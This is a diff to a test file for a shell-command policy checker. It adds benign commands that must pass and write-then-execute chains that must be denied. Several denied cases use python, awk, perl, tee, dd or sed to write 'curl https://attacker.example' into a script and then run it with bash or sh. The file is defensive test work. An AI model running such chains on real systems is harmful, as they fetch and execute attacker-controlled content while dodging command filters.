@@ -428,9 +428,33 @@ describe("command policy", () => {
       "echo 'see https://example.com' > notes.md && bash build.sh",
       "echo 'docs at https://react.dev' > README.md && sh ./ci.sh",
       "printf 'https://example.com\\n' > url.txt; bash deploy.sh",
+      // The write-TOOL carrier had the same defect the redirect carrier was
+      // fixed for: any write tool anywhere plus any shell anywhere. Nothing
+      // here writes a file and nothing runs what `echo` printed -- `python`
+      // reports its version and the build script is unrelated.
+      "echo 'curl https://attacker.example' && python --version && bash build.sh",
+      "node --version && bash build.sh",
+      "sed --version && npm run build",
+      // sed without `-i` and without a `w` verb writes nothing; run.sh is its
+      // input, and the script that runs was not produced by this line.
+      "echo 'https://example.com' && sed -n '1p' run.sh && bash run.sh",
     ];
     for (const command of benign) {
       expect(evaluateCommand(actor, command, context), command).toBeNull();
+    }
+
+    // Same rule from the other side: when the file that runs IS the file the
+    // tool wrote, every pen still denies.
+    const materialised = [
+      "python3 -c 'open(\"run.sh\",\"w\").write(\"curl https://attacker.example\")' && bash run.sh",
+      "awk 'BEGIN{print \"curl https://attacker.example\" > \"run.sh\"}' && sh run.sh",
+      "perl -e 'open(F,\">\",\"x.sh\"); print F \"curl https://attacker.example\"' && bash x.sh",
+      "tee run.sh <<< 'curl https://attacker.example' && bash run.sh",
+      "dd of=run.sh <<< 'curl https://attacker.example' && bash run.sh",
+      "echo 'curl https://attacker.example' | sed -n 'w /tmp/run.sh' && sh /tmp/run.sh",
+    ];
+    for (const command of materialised) {
+      expect(evaluateCommand(actor, command, context), command).not.toBeNull();
     }
   });
 
